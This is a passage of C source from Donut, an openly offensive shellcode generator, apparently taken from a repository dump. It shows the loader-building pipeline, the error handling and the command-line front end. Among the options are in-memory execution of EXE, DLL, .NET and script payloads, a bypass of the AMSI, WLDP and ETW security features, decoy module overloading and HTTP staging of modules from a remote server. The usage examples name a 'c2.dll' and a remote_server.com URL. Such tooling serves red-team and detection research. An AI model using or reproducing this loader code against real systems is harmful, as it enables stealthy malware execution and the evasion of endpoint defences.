Dirs(fi.data);\n    if(dir != NULL) {\n      rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;\n      DPRINT(\"EAT VA : %lx\", rva);\n      if(rva != 0) {\n        ofs = rva2ofs(fi.data, rva);\n        DPRINT(\"Offset = %\" PRIX64 \"\\n\", ofs);\n        if(ofs != -1) {\n          exp = (PIMAGE_EXPORT_DIRECTORY)(fi.data + ofs);\n          cnt = exp->NumberOfNames;\n          DPRINT(\"Number of exported functions : %lx\", cnt);\n          \n          if(cnt != 0) {\n            sym = (PDWORD)(rva2ofs(fi.data, exp->AddressOfNames) + fi.data);\n            // scan array for symbol\n            do {\n              str = (PCHAR)(rva2ofs(fi.data, sym[cnt - 1]) + fi.data);\n              // if match found, exit\n              if(strcmp(str, function) == 0) {\n                DPRINT(\"Found API\");\n                found = 1;\n                break;\n              }\n            } while (--cnt);\n          }\n        }\n      }\n    }\n    DPRINT(\"Leaving.\");\n    return found;\n}\n\n/**\n * Function: validate_file_cfg\n * ----------------------------\n *   Validates configuration for the input file.\n *\n *   INPUT  : Pointer to Donut configuration.\n *\n *   OUTPUT : Donut error code. \n */\nstatic int validate_file_cfg(PDONUT_CONFIG c) {\n    DPRINT(\"Validating configuration for input file.\");\n    \n    // Unmanaged EXE/DLL?\n    if(fi.type == DONUT_MODULE_DLL ||\n       fi.type == DONUT_MODULE_EXE)\n    {\n      // Requested shellcode is x86, but file is x64?\n      // Requested shellcode is x64, but file is x86?\n      if((c->arch == DONUT_ARCH_X86  && \n         fi.arch  == DONUT_ARCH_X64) ||\n         (c->arch == DONUT_ARCH_X64  &&\n         fi.arch  == DONUT_ARCH_X86))\n      {\n        DPRINT(\"Target architecture %\"PRId32 \" is not compatible with DLL/EXE %\"PRId32, c->arch, fi.arch);\n        return DONUT_ERROR_ARCH_MISMATCH;\n      }\n      // DLL function specified. Does it exist?\n      if(fi.type == DONUT_MODULE_DLL && c->method[0] != 0)\n      {\n        if(!is_dll_export(c->method)) {\n          DPRINT(\"Unable to locate function \\\"%s\\\" in DLL\", c->method);\n          return DONUT_ERROR_DLL_FUNCTION;\n        }\n      }\n    }    \n    // .NET DLL assembly?\n    if(fi.type == DONUT_MODULE_NET_DLL) {\n      // DLL requires class and method\n      if(c->cls[0] == 0 || c->method[0] == 0) {\n        DPRINT(\"Input file is a .NET assembly, but no class and method have been specified.\");\n        return DONUT_ERROR_NET_PARAMS;\n      }\n    }\n    \n    // is this an unmanaged DLL with parameters?\n    if(fi.type == DONUT_MODULE_DLL && c->args[0] != 0) {\n      // we need a DLL function\n      if(c->method[0] == 0) {\n        DPRINT(\"Parameters are provided for an unmanaged/native DLL, but no function.\");\n        return DONUT_ERROR_DLL_PARAM;\n      }\n    }\n    DPRINT(\"Validation passed.\");\n    return DONUT_ERROR_OK;\n}\n\n/**\n * Function: DonutCreate\n * ----------------------------\n *   Builds a position-independent loader for VBS/JS/EXE/DLL files.\n *\n *   INPUT  : Pointer to a Donut configuration.\n *\n *   OUTPUT : Donut error code.\n */\nEXPORT_FUNC \nint DonutCreate(PDONUT_CONFIG c) {\n    int err = DONUT_ERROR_OK;\n    \n    DPRINT(\"Entering.\");\n    \n    c->mod = c->pic = c->inst = NULL;\n    c->mod_len = c->pic_len = c->inst_len = 0;\n    \n    // 1. validate the loader configuration\n    err = validate_loader_cfg(c);\n    if(err == DONUT_ERROR_OK) {\n      // 2. get information about the file to execute in memory\n      err = read_file_info(c);\n      if(err == DONUT_ERROR_OK) {\n        // 3. validate the module configuration\n        err = validate_file_cfg(c);\n        if(err == DONUT_ERROR_OK) {\n          // 4. build the module\n          err = build_module(c);\n          if(err == DONUT_ERROR_OK) {\n            // 5. build the instance\n            err = build_instance(c);\n            if(err == DONUT_ERROR_OK) {\n              // 6. build the loader\n              err = build_loader(c);\n              if(err == DONUT_ERROR_OK) {\n                // 7. save loader and any additional files to disk\n                err = save_loader(c);\n              }\n            }\n          }\n        }\n      }\n    }\n    // if there was some error, release resources\n    if(err != DONUT_ERROR_OK) {\n      DonutDelete(c);\n    }\n    DPRINT(\"Leaving with error :  %\" PRId32, err);\n    return err;\n}\n\n/**\n * Function: DonutDelete\n * ----------------------------\n *   Releases memory allocated by internal Donut functions.\n *\n *   INPUT  : Pointer to a Donut configuration previously used by DonutCreate.\n *\n *   OUTPUT : Donut error code.\n */\nEXPORT_FUNC \nint DonutDelete(PDONUT_CONFIG c) {\n    \n    DPRINT(\"Entering.\");\n    if(c == NULL) {\n      return DONUT_ERROR_INVALID_PARAMETER;\n    }\n    // free module\n    if(c->mod != NULL) {\n      DPRINT(\"Releasing memory for module.\");\n      free(c->mod);\n      c->mod = NULL;\n    }\n    // free instance\n    if(c->inst != NULL) {\n      DPRINT(\"Releasing memory for configuration.\");\n      free(c->inst);\n      c->inst = NULL;\n    }\n    // free loader\n    if(c->pic != NULL) {\n      DPRINT(\"Releasing memory for loader.\");\n      free(c->pic);\n      c->pic = NULL;\n    }\n    unmap_file();\n    \n    DPRINT(\"Leaving.\");\n    return DONUT_ERROR_OK;\n}\n\n/**\n * Function: DonutError\n * ----------------------------\n *   Converts Donut error code into a string\n *\n *   INPUT  : error code returned by DonutCreate\n *\n *   OUTPUT : error code as a string \n */\nEXPORT_FUNC\nconst char *DonutError(int err) {\n    static const char *str=\"N/A\";\n    \n    switch(err) {\n      case DONUT_ERROR_OK:\n        str = \"No error.\";\n        break;\n      case DONUT_ERROR_FILE_NOT_FOUND:\n        str = \"File not found.\";\n        break;\n      case DONUT_ERROR_FILE_EMPTY:\n        str = \"File is empty.\";\n        break;\n      case DONUT_ERROR_FILE_ACCESS:\n        str = \"Cannot open file.\";\n        break;\n      case DONUT_ERROR_FILE_INVALID:\n        str = \"File is invalid.\";\n        break;      \n      case DONUT_ERROR_NET_PARAMS:\n        str = \"File is a .NET DLL. Donut requires a class and method.\";\n        break;\n      case DONUT_ERROR_NO_MEMORY:\n        str = \"Memory allocation failed.\";\n        break;\n      case DONUT_ERROR_INVALID_ARCH:\n        str = \"Invalid architecture specified.\";\n        break;      \n      case DONUT_ERROR_INVALID_URL:\n        str = \"Invalid URL.\";\n        break;\n      case DONUT_ERROR_URL_LENGTH:\n        str = \"Invalid URL length.\";\n        break;\n      case DONUT_ERROR_INVALID_PARAMETER:\n        str = \"Invalid parameter.\";\n        break;\n      case DONUT_ERROR_RANDOM:\n        str = \"Error generating random values.\";\n        break;\n      case DONUT_ERROR_DLL_FUNCTION:\n        str = \"Unable to locate DLL function provided. Names are case sensitive.\";\n        break;\n      case DONUT_ERROR_ARCH_MISMATCH:\n        str = \"Target architecture cannot support selected DLL/EXE file.\";\n        break;\n      case DONUT_ERROR_DLL_PARAM:\n        str = \"You've supplied parameters for an unmanaged DLL. Donut also requires a DLL function.\";\n        break;\n      case DONUT_ERROR_BYPASS_INVALID:\n        str = \"Invalid bypass option specified.\";\n        break;\n      case DONUT_ERROR_HEADERS_INVALID:\n        str = \"Invalid PE headers preservation option.\";\n        break;\n      case DONUT_ERROR_INVALID_FORMAT:\n        str = \"The output format is invalid.\";\n        break;\n      case DONUT_ERROR_INVALID_ENGINE:\n        str = \"The compression engine is invalid.\";\n        break;\n      case DONUT_ERROR_COMPRESSION:\n        str = \"There was an error during compression.\";\n        break;\n      case DONUT_ERROR_INVALID_ENTROPY:\n        str = \"Invalid entropy level specified.\";\n        break;\n      case DONUT_ERROR_MIXED_ASSEMBLY:\n        str = \"Mixed (native and managed) assemblies are currently unsupported.\";\n        break;\n      case DONUT_ERROR_DECOY_INVALID:\n        str = \"Path of decoy module is invalid.\";\n        break;\n    }\n    DPRINT(\"Error result : %s\", str);\n    return str;\n}\n\n#ifdef DONUT_EXE\n\n#define OPT_MAX_STRING 256\n\n#define OPT_TYPE_NONE   1\n#define OPT_TYPE_STRING 2\n#define OPT_TYPE_DEC    3\n#define OPT_TYPE_HEX    4\n#define OPT_TYPE_FLAG   5\n#define OPT_TYPE_DEC64  6\n#define OPT_TYPE_HEX64  7\n\n// structure to hold data of any type\ntypedef union _opt_arg_t {\n    int flag;\n\n    int8_t s8;\n    uint8_t u8;\n    int8_t *s8_ptr;\n    uint8_t *u8_ptr;\n\n    int16_t s16;\n    uint16_t u16;\n    int16_t *s16_ptr;\n    uint16_t *u16_ptr;\n\n    int32_t s32;\n    uint32_t u32;\n    int32_t *s32_ptr;\n    uint32_t *u32_ptr;\n\n    int64_t s64;\n    uint64_t u64;\n    int64_t *s64_ptr;\n    uint64_t *u64_ptr;      \n\n    void *ptr;\n    char str[OPT_MAX_STRING+1];\n} opt_arg;\n\ntypedef void (*void_callback_t)(void);         // execute callback with no return value or argument\ntypedef int (*arg_callback_t)(opt_arg*,void*); // process argument, optionally store in optarg\n\nstatic int get_opt(\n  int argc,         // total number of elements in argv\n  char *argv[],     // argument array\n  int arg_type,     // type of argument expected (none, flag, decimal, hexadecimal, string)\n  void *output,     // pointer to variable that stores argument\n  char *short_opt,  // short form of option. e.g: -a\n  char *long_opt,   // long form of option. e.g: --arch\n  void *callback)   // callback function to process argument\n{\n    int  valid = 0, i, req = 0, opt_len, opt_type;\n    char *args=NULL, *opt=NULL, *arg=NULL, *tmp=NULL;\n    opt_arg *optarg = (opt_arg*)output;\n    void_callback_t void_cb;\n    arg_callback_t  arg_cb;\n    \n    // perform some basic validation\n    if(argc <= 1) return 0;\n    if(argv == NULL) return 0;\n    \n    if(arg_type != OPT_TYPE_NONE   &&\n       arg_type != OPT_TYPE_STRING &&\n       arg_type != OPT_TYPE_DEC    &&\n       arg_type != OPT_TYPE_HEX    &&\n       arg_type != OPT_TYPE_FLAG) return 0;\n    \n    DPRINT(\"Arg type for %s, %s : %s\",\n      short_opt != NULL ? short_opt : \"N/A\",\n      long_opt != NULL ? long_opt : \"N/A\",\n      arg_type == OPT_TYPE_NONE ? \"None\" : \n      arg_type == OPT_TYPE_STRING ? \"String\" :\n      arg_type == OPT_TYPE_DEC ? \"Decimal\" :\n      arg_type == OPT_TYPE_HEX ? \"Hexadecimal\" :\n      arg_type == OPT_TYPE_FLAG ? \"Flag\" : \"Unknown\");\n      \n    // for each argument in array\n    for(i=1; i<argc && !valid; i++) {\n      // set the current argument to examine\n      arg = argv[i];\n      // if it doesn't contain a switch, skip it\n      if(*arg != '-') continue;\n      // we have a switch. initially, we assume short form\n      arg++;\n      opt_type = 0;\n      // long form? skip one more and change the option type\n      if(*arg == '-') {\n        arg++;\n        opt_type++;\n      }\n      \n      // is an argument required by the user?\n      req = ((arg_type != OPT_TYPE_NONE) && (arg_type != OPT_TYPE_FLAG));\n      // use short or long form for current argument being examined\n      opt = (opt_type) ? long_opt : short_opt;\n      // if no form provided by user for current argument, skip it\n      if(opt == NULL) continue;\n      // copy string to dynamic buffer\n      opt_len = strlen(opt);\n      if(opt_len == 0) continue;\n      \n      tmp = calloc(sizeof(uint8_t), opt_len + 1);\n      if(tmp == NULL) {\n        DPRINT(\"Unable to allocate memory for %s.\\n\", opt);\n        continue;\n      } else {\n        strcpy(tmp, opt);\n      }\n      // tokenize the string.\n      opt = strtok(tmp, \";\");\n      // while we have options\n      while(opt != NULL && !valid) {\n        // get the length\n        opt_len = strlen(opt);\n        // do we have a match?   \n        if(!strncmp(opt, arg, opt_len)) {\n          //\n          // at this point, we have a valid matching argument\n          // if something fails from here on in, return invalid\n          // \n          // skip the option\n          arg += opt_len;\n          // an argument is *not* required\n          if(!req) {\n            // so is the next byte non-zero? return invalid\n            if(*arg != 0) return 0;\n          } else {\n            // an argument is required\n            // if the next byte is a colon or assignment operator, skip it.\n            if(*arg == ':' || *arg == '=') arg++;\n         \n            // if the next byte is zero\n            if(*arg == 0) { \n              // and no arguments left. return invalid\n              if((i + 1) >= argc) return 0;\n              args = argv[i + 1];\n            } else {\n              args = arg;\n            }\n          }\n          // end loop\n          valid = 1;\n          break;\n        }\n        opt = strtok(NULL, \";\");\n      }\n      if(tmp != NULL) free(tmp);\n    }\n    \n    // if valid option found\n    if(valid) {\n      DPRINT(\"Found match\");\n      // ..and a callback exists\n      if(callback != NULL) {\n        // if we have a parameter\n        if(args != NULL) {\n          DPRINT(\"Executing callback with %s.\", args);\n          // execute with parameter\n          arg_cb = (arg_callback_t)callback;\n          arg_cb(optarg, args);\n        } else {\n          DPRINT(\"Executing callback.\");\n          // otherwise, execute without\n          void_cb = (void_callback_t)callback;\n          void_cb();\n        }\n      } else {\n        // there's no callback, try process ourselves\n        if(args != NULL) {\n          DPRINT(\"Parsing %s\\n\", args);\n          switch(arg_type) {\n            case OPT_TYPE_DEC:\n            case OPT_TYPE_HEX:\n              DPRINT(\"Converting %s to 32-bit binary\", args);\n              optarg->u32 = strtoul(args, NULL, arg_type == OPT_TYPE_DEC ? 10 : 16);\n              break;\n            case OPT_TYPE_DEC64:\n            case OPT_TYPE_HEX64:\n              DPRINT(\"Converting %s to 64-bit binary\", args);\n              optarg->u64 = strtoull(args, NULL, arg_type == OPT_TYPE_DEC64 ? 10 : 16);\n              break;\n            case OPT_TYPE_STRING:\n              DPRINT(\"Copying %s to output\", args);\n              strncpy(optarg->str, args, OPT_MAX_STRING);\n              break;\n          }\n        } else {\n          // there's no argument, just set the flag\n          DPRINT(\"Setting flag\");\n          optarg->flag = 1;\n        }\n      }\n    }\n    // return result\n    return valid;\n}\n\n// callback to validate architecture\nstatic int validate_arch(opt_arg *arg, void *args) {\n    char *str = (char*)args;\n    \n    arg->u32 = 0;\n    if(str == NULL) return 0;\n    \n    // single digit? convert to binary\n    if(strlen(str) == 1 && isdigit((int)*str)) {\n      arg->u32 = atoi(str);\n    } else {\n      // otherwise, try map it to digit\n      if(!strcasecmp(\"x86\", str)) {\n        arg->u32 = DONUT_ARCH_X86;\n      } else\n      if(!strcasecmp(\"amd64\", str)) {\n        arg->u32 = DONUT_ARCH_X64;\n      } else\n      if(!strcasecmp(\"x84\", str)) {\n        arg->u32 = DONUT_ARCH_X84;\n      }\n    }\n    \n    // validate\n    switch(arg->u32) {\n      case DONUT_ARCH_X86:\n      case DONUT_ARCH_X64:\n      case DONUT_ARCH_X84:\n        break;\n      default: {\n        printf(\"WARNING: Invalid architecture specified: %\"PRId32\" -- setting to x86+amd64\\n\", arg->u32);\n        arg->u32 = DONUT_ARCH_X84;\n      }          \n    }\n    return 1;\n}\n\nstatic int validate_exit(opt_arg *arg, void *args) {\n    char *str = (char*)args;\n    \n    arg->u32 = 0;\n    if(str == NULL) return 0;\n    \n    if(strlen(str) == 1 && isdigit((int)*str)) {\n      arg->u32 = atoi(str);\n    } else {\n      if(!strcasecmp(\"thread\", str)) {\n        arg->u32 = DONUT_OPT_EXIT_THREAD;\n      } else\n      if(!strcasecmp(\"process\", str)) {\n        arg->u32 = DONUT_OPT_EXIT_PROCESS;\n      }\n      if(!strcasecmp(\"block\", str)) {\n        arg->u32 = DONUT_OPT_EXIT_BLOCK;\n      }\n    }\n    \n    switch(arg->u32) {\n      case DONUT_OPT_EXIT_THREAD:\n      case DONUT_OPT_EXIT_PROCESS:\n      case DONUT_OPT_EXIT_BLOCK:\n        break;\n      default: {\n        printf(\"WARNING: Invalid exit option specified: %\"PRId32\" -- setting to thread\\n\", arg->u32);\n        arg->u32 = DONUT_OPT_EXIT_THREAD;\n      }\n    }\n    return 1;\n}\n \nstatic int validate_entropy(opt_arg *arg, void *args) {\n    char *str = (char*)args;\n    \n    arg->u32 = 0;\n    if(str == NULL) {\n      DPRINT(\"NULL argument.\");\n      return 0;\n    }\n    if(strlen(str) == 1 && isdigit((int)*str)) {\n      DPRINT(\"Converting %s to number.\", str);\n      arg->u32 = strtoul(str, NULL, 10);\n    } else {\n      if(!strcasecmp(\"none\", str)) {\n        arg->u32 = DONUT_ENTROPY_NONE;\n      } else\n      if(!strcasecmp(\"low\", str)) {\n        arg->u32 = DONUT_ENTROPY_RANDOM;\n      } else\n      if(!strcasecmp(\"full\", str)) {\n        arg->u32 = DONUT_ENTROPY_DEFAULT;\n      }\n    }\n    \n    // validate\n    switch(arg->u32) {\n      case DONUT_ENTROPY_NONE:\n      case DONUT_ENTROPY_RANDOM:\n      case DONUT_ENTROPY_DEFAULT:\n        break;\n      default: {\n        printf(\"WARNING: Invalid entropy option specified: %\"PRId32\" -- setting to default\\n\", arg->u32);\n        arg->u32 = DONUT_ENTROPY_DEFAULT;\n      }\n    }\n    return 1;\n}\n\n// callback to validate format\nstatic int validate_format(opt_arg *arg, void *args) {\n    char *str = (char*)args;\n    \n    arg->u32 = 0;\n    if(str == NULL) return 0;\n    \n    // if it's a single digit, return it as binary\n    if(strlen(str) == 1 && isdigit((int)*str)) {\n      arg->u32 = atoi(str);\n    } else {\n      // otherwise, try map it to digit\n      if(!strcasecmp(\"bin\", str)) {\n        arg->u32 = DONUT_FORMAT_BINARY;\n      } else\n      if(!strcasecmp(\"base64\", str)) {\n        arg->u32 = DONUT_FORMAT_BASE64;\n      } else\n      if(!strcasecmp(\"c\", str)) {\n        arg->u32 = DONUT_FORMAT_C;\n      } else \n      if(!strcasecmp(\"rb\", str) || !strcasecmp(\"ruby\", str)) {\n        arg->u32 = DONUT_FORMAT_RUBY;\n      } else\n      if(!strcasecmp(\"py\", str) || !strcasecmp(\"python\", str)) {\n        arg->u32 = DONUT_FORMAT_PYTHON;\n      } else\n      if(!strcasecmp(\"ps\", str) || !strcasecmp(\"powershell\", str)) {\n        arg->u32 = DONUT_FORMAT_POWERSHELL;\n      } else\n      if(!strcasecmp(\"cs\", str) || !strcasecmp(\"csharp\", str)) {\n        arg->u32 = DONUT_FORMAT_CSHARP;\n      } else\n      if(!strcasecmp(\"hex\", str)) {\n        arg->u32 = DONUT_FORMAT_HEX;\n      }\n    }\n    // validate\n    switch(arg->u32) {\n      case DONUT_FORMAT_BINARY:\n      case DONUT_FORMAT_BASE64:\n      case DONUT_FORMAT_C:\n      case DONUT_FORMAT_RUBY:\n      case DONUT_FORMAT_PYTHON:\n      case DONUT_FORMAT_POWERSHELL:\n      case DONUT_FORMAT_CSHARP:\n      case DONUT_FORMAT_HEX:\n        break;\n      default: {\n        printf(\"WARNING: Invalid format specified: %\"PRId32\" -- setting to binary.\\n\", arg->u32);\n        arg->u32 = DONUT_FORMAT_BINARY;\n      }\n    }\n    return 1;\n}\n\n// --bypass=w\n//\n// \n// a = amsi\n// e = etw\n// w = wldp\n//\n// --bypass=w\nstatic int validate_bypass(opt_arg *arg, void *args) {\n    char *str = (char*)args;\n    \n    arg->u32 = 0;\n    if(str == NULL) return 0;\n    \n    // just temporary\n    arg->u32 = atoi(str);\n    \n    return 1;\n}\n\n// calback to validate headers options\nstatic int validate_headers(opt_arg *arg, void *args) {\n    char *str = (char*)args;\n    \n    arg->u32 = 0;\n    if(str == NULL) return 0;\n    \n    // just temporary\n    arg->u32 = atoi(str);\n    \n    return 1;\n}\n\nstatic void usage (void) {\n    printf(\" usage: donut [options] <EXE/DLL/VBS/JS>\\n\\n\");\n    printf(\"       Only the finest artisanal donuts are made of shells.\\n\\n\");   \n    printf(\"                   -MODULE OPTIONS-\\n\\n\");\n    printf(\"       -n,--modname: <name>                    Module name for HTTP staging. If entropy is enabled, this is generated randomly.\\n\");\n    printf(\"       -s,--server: <server>                   Server that will host the Donut module. Credentials may be provided in the following format: https://username:password@192.168.0.1/\\n\");\n    printf(\"       -e,--entropy: <level>                   Entropy. 1=None, 2=Use random names, 3=Random names + symmetric encryption (default)\\n\\n\");\n    \n    printf(\"                   -PIC/SHELLCODE OPTIONS-\\n\\n\");    \n    printf(\"       -a,--arch: <arch>,--cpu: <arch>         Target architecture : 1=x86, 2=amd64, 3=x86+amd64(default).\\n\");\n    printf(\"       -o,--output: <path>                     Output file to save loader. Default is \\\"loader.bin\\\"\\n\");\n    printf(\"       -f,--format: <format>                   Output format. 1=Binary (default), 2=Base64, 3=C, 4=Ruby, 5=Python, 6=Powershell, 7=C#, 8=Hex\\n\");\n    printf(\"       -y,--fork: <offset>                     Create a new thread for the loader and continue execution at <offset> relative to the host process's executable.\\n\");\n    printf(\"       -x,--exit: <action>                     Exit behaviour. 1=Exit thread (default), 2=Exit process, 3=Do not exit or cleanup and block indefinitely\\n\\n\");\n    \n    printf(\"                   -FILE OPTIONS-\\n\\n\");\n    printf(\"       -c,--class: <namespace.class>           Optional class name. (required for .NET DLL)\\n\");\n    printf(\"       -d,--domain: <name>                     AppDomain name to create for .NET assembly. If entropy is enabled, this is generated randomly.\\n\");\n    printf(\"       -i,--input: <path>,--file: <path>       Input file to execute in-memory.\\n\");\n    printf(\"       -m,--method: <method>,--function: <api> Optional method or function for DLL. (a method is required for .NET DLL)\\n\");\n    printf(\"       -p,--args: <arguments>                  Optional parameters/command line inside quotations for DLL method/function or EXE.\\n\");\n    printf(\"       -w,--unicode                            Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)\\n\");\n    printf(\"       -r,--runtime: <version>                 CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.\\n\");\n    printf(\"       -t,--thread                             Execute the entrypoint of an unmanaged EXE as a thread.\\n\\n\");\n    \n    printf(\"                   -EXTRA-\\n\\n\"); \n#ifdef WINDOWS\n    printf(\"       -z,--compress: <engine>                 Pack/Compress file. 1=None, 2=aPLib, 3=LZNT1, 4=Xpress.\\n\");\n#else\n    printf(\"       -z,--compress: <engine>                 Pack/Compress file. 1=None, 2=aPLib\\n\");\n#endif\n    printf(\"       -b,--bypass: <level>                    Bypass AMSI/WLDP/ETW : 1=None, 2=Abort on fail, 3=Continue on fail.(default)\\n\\n\");\n    printf(\"       -k,--headers: <level>                   Preserve PE headers. 1=Overwrite (default), 2=Keep all\\n\\n\");\n    printf(\"       -j,--decoy: <level>                     Optional path of decoy module for Module Overloading.\\n\\n\");\n    \n    printf(\" examples:\\n\\n\");\n    printf(\"    donut -ic2.dll\\n\");\n    printf(\"    donut --arch:x86 --class:TestClass --method:RunProcess --args:notepad.exe --input:loader.dll\\n\");\n    printf(\"    donut -iloader.dll -c TestClass -m RunProcess -p\\\"calc notepad\\\" -s http://remote_server.com/modules/\\n\");\n    \n    exit (0);\n}\n\nint main(int argc, char *argv[]) {\n    DONUT_CONFIG c;\n    int          err;\n    char         *mod_type;\n    char         *arch_str[3] = { \"x86\", \"amd64\", \"x86+amd64\" };\n    char         *inst_type[2]= { \"Embedded\", \"HTTP\" };\n    \n    printf(\"\\n\");\n    printf(\"  [ Donut shellcode generator v1 (built \" __DATE__ \" \" __TIME__ \")\\n\");\n    printf(\"  [ Copyright (c) 2019-2021 TheWover, Odzhan\\n\\n\");\n    \n    // zero initialize configuration\n    memset(&c, 0, sizeof(c));\n    \n    // default settings\n    c.inst_type = DONUT_INSTANCE_EMBED;   // file is embedded\n    c.arch      = DONUT_ARCH_X84;         // dual-mode (x86+amd64)\n    c.bypass    = DONUT_BYPASS_CONTINUE;  // continues loading even if disabling AMSI/WLDP/ETW fails\n    c.headers   = DONUT_HEADERS_OVERWRITE;// overwrites PE headers\n    c.format    = DONUT_FORMAT_BINARY;    // default output format\n    c.compress  = DONUT_COMPRESS_NONE;    // compression is disabled by default\n    c.entropy   = DONUT_ENTROPY_DEFAULT;  // enable random names + symmetric encryption by default\n    c.exit_opt  = DONUT_OPT_EXIT_THREAD;  // default behaviour is to exit the thread\n    c.unicode   = 0;                      // command line will not be converted to unicode for unmanaged DLL function\n    \n    // get options\n    get_opt(argc, argv, OPT_TYPE_NONE,   NULL,       \"h;?\", \"help\",            usage);\n    get_opt(argc, argv, OPT_TYPE_DEC,    &c.arch,    \"a\",   \"arch\",            validate_arch);\n    get_opt(argc, argv, OPT_TYPE_DEC,    &c.bypass,  \"b\",   \"bypass\",          validate_bypass);\n    get_opt(argc, argv, OPT_TYPE_DEC,    &c.headers, \"k\",   \"headers\",         validate_headers);\n    get_opt(argc, argv, OPT_TYPE_STRING, c.cls,      \"c\",   \"class\",           NULL);\n    get_opt(argc, argv, OPT_TYPE_STRING, c.domain,   \"d\",   \"domain\",          NULL);\n    get_opt(argc, argv, OPT_TYPE_DEC,    &c.entropy, \"e\",   \"entropy\",         validate_entropy);\n    get_opt(argc, argv, OPT_TYPE_DEC,    &c.format,  \"f\",   \"format\",          validate_format);\n    get_opt(argc, argv, OPT_TYPE_STRING, c.input,    \"i\",   \"input;file\",      NULL);\n    get_opt(argc, argv, OPT_TYPE_STRING, c.method,   \"m\",   \"method;function\", NULL);\n    get_opt(argc, argv, OPT_TYPE_STRING, c.modname,  \"n\",   \"modname\",         NULL);\n    get_opt(argc, argv, OPT_TYPE_STRING, c.decoy,    \"j\",   \"decoy\",           NULL);\n    get_opt(argc, argv, OPT_TYPE_STRING, c.output,   \"o\",   \"output\",          NULL);\n    get_opt(argc, argv, OPT_TYPE_STRING, c.args,     \"p\",   \"params;args\",     NULL);\n    get_opt(argc, argv, OPT_TYPE_STRING, c.runtime,  \"r\",   \"runtime\",         NULL);\n    get_opt(argc, argv, OPT_TYPE_STRING, c.server,   \"s\",   \"server\",          NULL);\n    get_opt(argc, argv, OPT_TYPE_FLAG,   &c.thread,  \"t\",   \"thread\",          NULL);\n    get_opt(argc, argv, OPT_TYPE_FLAG,   &c.unicode, \"w\",   \"unicode\",         NULL);\n    get_opt(argc, argv, OPT_TYPE_DEC,    &c.exit_opt,\"x\",   \"exit\",            validate_exit);\n    get_opt(argc, argv, OPT_TYPE_HEX,    &c.oep,     \"y\",   \"oep;fork\",        NULL);\n    get_opt(argc, argv, OPT_TYPE_DEC,    &c.compress,\"z\",   \"compress\",        NULL);\n    \n    // no file? show usage and exit\n    if(c.input[0] == 0) {\n      usage();\n    }\n    \n    // server specified?\n    if(c.server[0] != 0) {\n      c.inst_type = DONUT_INSTANCE_HTTP;\n    }\n    \n    // generate loader from configuration\n    err = DonutCreate(&c);\n\n    if(err != DONUT_ERROR_OK) {\n      printf(\"  [ Error : %s\\n\", DonutError(err));\n      return 0;\n    }\n    \n    switch(c.mod_type) {\n      case DONUT_MODULE_DLL:\n        mod_type = \"DLL\";\n        break;\n      case DONUT_MODULE_EXE:\n        mod_type = \"EXE\";\n        break;\n      case DONUT_MODULE_NET_DLL:\n        mod_type = \".NET DLL\";\n        break;\n      case DONUT_MODULE_NET_EXE:\n        mod_type = \".NET EXE\";\n        break;\n      case DONUT_MODULE_VBS:\n        mod_type = \"VBScript\";\n        break;\n      case DONUT_MODULE_JS:\n        mod_type = \"JScript\";\n        break;\n      default:\n        mod_type = \"Unrecognized\";\n        break;\n    }\n    \n    printf(\"  [ Instance type : %s\\n\",     inst_type[c.inst_type - 1]);\n    printf(\"  [ Module file   : \\\"%s\\\"\\n\", c.input);\n    printf(\"  [ Entropy       : %s\\n\", \n      c.entropy == DONUT_ENTROPY_NONE   ? \"None\" :\n      c.entropy == DONUT_ENTROPY_RANDOM ? \"Random Names\" : \"Random names + Encryption\");      \n    \n    if(c.compress != DONUT_COMPRESS_NONE) {\n      printf(\"  [ Compressed    : %s (Reduced by %\"PRId32\"%%)\\n\",\n        c.compress == DONUT_COMPRESS_APLIB  ? \"aPLib\" :\n        c.compress == DONUT_COMPRESS_LZNT1  ? \"LZNT1\" : \"Xpress\",\n        file_diff(c.zlen, c.len));\n    }\n    \n    printf(\"  [ File type     : %s\\n\",     mod_type);\n    \n    // if this is a .NET DLL, display the class and method\n    if(c.mod_type == DONUT_MODULE_NET_DLL) {\n      printf(\"  [ Class         : %s\\n\", c.cls   );\n      printf(\"  [ Method        : %s\\n\", c.method);\n      printf(\"  [ Domain        : %s\\n\", \n        c.domain[0] == 0 ? \"Default\" : c.domain);\n    } else\n    if(c.mod_type == DONUT_MODULE_DLL) {\n      printf(\"  [ Function      : %s\\n\", \n        c.method[0] != 0 ? c.method : \"DllMain\");\n    }\n\n    // if parameters supplied, display them\n    if(c.args[0] != 0) {\n      printf(\"  [ Parameters    : %s\\n\", c.args);\n    }\n    printf(\"  [ Target CPU    : %s\\n\", arch_str[c.arch - 1]);\n    \n    if(c.inst_type == DONUT_INSTANCE_HTTP) {\n      printf(\"  [ Module name   : %s\\n\", c.modname);\n      printf(\"  [ Upload to     : %s\\n\", c.server);\n    }\n    \n    printf(\"  [ AMSI/WDLP/ETW : %s\\n\",\n      c.bypass == DONUT_BYPASS_NONE  ? \"none\" : \n      c.bypass == DONUT_BYPASS_ABORT ? \"abort\" : \"continue\");\n\n    printf(\"  [ PE Headers    : %s\\n\",\n      c.headers == DONUT_HEADERS_OVERWRITE  ? \"overwrite\" : \n      c.headers == DONUT_HEADERS_KEEP ? \"keep\" : \"Undefined\"); \n    \n    printf(\"  [ Shellcode     : \\\"%s\\\"\\n\", c.output);\n    if(c.oep != 0) {\n      printf(\"  [ OEP           : 0x%\"PRIX32\"\\n\", c.oep);\n    }\n\n    // if decoy supplied, display the path\n    if(c.decoy[0] != 0) {\n      printf(\"  [ Decoy path    : %s\\n\", c.decoy);\n    }\n    \n    printf(\"  [ Exit          : %s\\n\", \n      c.exit_opt == DONUT_OPT_EXIT_THREAD ? \"Thread\" : \n      c.exit_opt == DONUT_OPT_EXIT_PROCESS ? \"Process\" : \n      c.exit_opt == DONUT_OPT_EXIT_BLOCK ? \"Block\" : \"Undefined\");\n    DonutDelete(&c);\n    return 0;\n}\n#endif\n\n"
        },
        {
          "name": "donutmodule.c",
          "type": "blob",
          "size": 7.9384765625,
